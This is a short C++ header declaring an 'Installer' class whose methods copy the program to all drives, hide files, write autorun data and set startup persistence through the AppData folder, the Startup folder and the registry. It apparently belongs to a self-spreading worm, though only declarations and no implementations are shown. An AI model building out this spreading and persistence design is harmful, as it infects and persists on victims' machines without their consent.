#pragma once
#include "stdafx.h"

class Installer
{
public:
	Installer();
	~Installer();

	bool SetAutorun(bool autorun);
	bool InstallOnDrives();

private:
	bool InstallOnDrive(const TCHAR* drive);

	bool CopyTo(const TCHAR* path);
	bool HideFile(const TCHAR* path);
	bool SetAutorunAppdata(bool autorun);
	bool SetAutorunStartup(bool autorun);
	bool SetAutorunRegistry(bool autorun);

	bool SetAutorunRegistryWithKey(bool autorun, HKEY key, const TCHAR* subkey);

	TCHAR exeName[MAX_PATH];
	TCHAR appDataPath[1024];
	TCHAR registryPath[1024];
	TCHAR startupPath[1024];

	char autorunData[1024];
	size_t autorunBytes;
};

extern Installer installer;